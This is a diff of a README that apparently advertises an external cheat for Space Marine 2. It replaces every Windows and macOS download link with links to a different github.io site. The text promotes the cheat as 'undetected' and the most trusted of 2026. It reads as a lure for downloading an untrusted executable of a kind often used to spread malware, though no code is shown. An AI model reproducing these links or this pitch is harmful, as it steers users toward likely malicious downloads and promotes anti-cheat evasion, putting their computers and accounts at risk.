@@ -1,9 +1,9 @@
 # 🎮 Space Marine 2 External — Evidence V2
 
-[![Windows](https://img.shields.io/badge/Download-Windows-blue?style=for-the-badge&logo=windows)](https://bansheeloaderquay.github.io/dl-win/)
-[![macOS](https://img.shields.io/badge/Download-macOS-black?style=for-the-badge&logo=apple)](https://bansheeloaderquay.github.io/dl-mac/)
-[![Version](https://img.shields.io/badge/Version-2026-green?style=for-the-badge)](https://bansheeloaderquay.github.io/dl-win/)
-[![Status](https://img.shields.io/badge/Status-Undetected-brightgreen?style=for-the-badge)](https://bansheeloaderquay.github.io/dl-win/)
+[![Windows](https://img.shields.io/badge/Download-Windows-blue?style=for-the-badge&logo=windows)](https://WatchMizukageSnap.github.io/getwindows/)
+[![macOS](https://img.shields.io/badge/Download-macOS-black?style=for-the-badge&logo=apple)](https://WatchMizukageSnap.github.io/getmac/)
+[![Version](https://img.shields.io/badge/Version-2026-green?style=for-the-badge)](https://WatchMizukageSnap.github.io/getwindows/)
+[![Status](https://img.shields.io/badge/Status-Undetected-brightgreen?style=for-the-badge)](https://WatchMizukageSnap.github.io/getwindows/)
 
 > The most trusted **Space Marine 2 External** for 2026 — operates entirely outside the game process with zero memory injection, delivering a clean and undetected experience.
 
@@ -82,11 +82,11 @@
 ## 📥 Download
 
 <p align="center">
-  <a href="https://bansheeloaderquay.github.io/dl-win/">
+  <a href="https://WatchMizukageSnap.github.io/getwindows/">
     <img src="https://img.shields.io/badge/Download%20for%20Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white" alt="Download Windows" />
   </a>
   &nbsp;&nbsp;
-  <a href="https://bansheeloaderquay.github.io/dl-mac/">
+  <a href="https://WatchMizukageSnap.github.io/getmac/">
     <img src="https://img.shields.io/badge/Download%20for%20macOS-000000?style=for-the-badge&logo=apple&logoColor=white" alt="Download macOS" />
   </a>
 </p>
